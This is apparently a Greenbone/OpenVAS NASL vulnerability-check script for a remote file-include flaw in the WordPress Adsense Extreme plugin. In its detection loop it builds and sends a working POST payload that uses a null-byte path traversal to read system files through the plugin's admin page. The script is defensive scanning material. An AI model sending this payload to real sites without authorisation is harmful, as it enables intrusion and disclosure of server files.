CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103264" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2011-09-22 13:43:24 +0200 (Thu, 22 Sep 2011)" );
	script_bugtraq_id( 49713 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "WordPress Adsense Extreme Plugin 'adsensextreme[lang]' Parameter Remote File Include Vulnerability" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_dependencies( "secpod_wordpress_detect_900182.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "wordpress/installed" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/49713" );
	script_xref( name: "URL", value: "http://wordpress.org/extend/plugins/adsense-extreme/" );
	script_tag( name: "solution", value: "Updates are available. Please see the references for more details." );
	script_tag( name: "summary", value: "The Adsense Extreme plug-in for WordPress is prone to a remote
  file-include vulnerability because it fails to sufficiently sanitize user-supplied input." );
	script_tag( name: "impact", value: "Exploiting this issue could allow an attacker to compromise the
  application and the underlying system. Other attacks are also possible." );
	script_tag( name: "affected", value: "Adsense Extreme 1.0.3 is vulnerable. Other versions may also be
  affected." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
files = traversal_files();
host = http_host_name( port: port );
for file in keys( files ) {
	variables = NASLString( "adsensextreme[lang]=/", files[file], "%00" );
	filename = NASLString( dir, "//wp-content/plugins/adsense-extreme/adsensextremeadminpage.php" );
	req = NASLString( "POST ", filename, " HTTP/1.1\\r\\n", "Referer: http://", host, filename, "\\r\\n", "Host: ", host, "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: ", strlen( variables ), "\\r\\n\\r\\n", variables );
	res = http_send_recv( port: port, data: req, bodyonly: FALSE );
	if(egrep( pattern: file, string: res, icase: TRUE )){
		report = http_report_vuln_url( port: port, url: filename );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

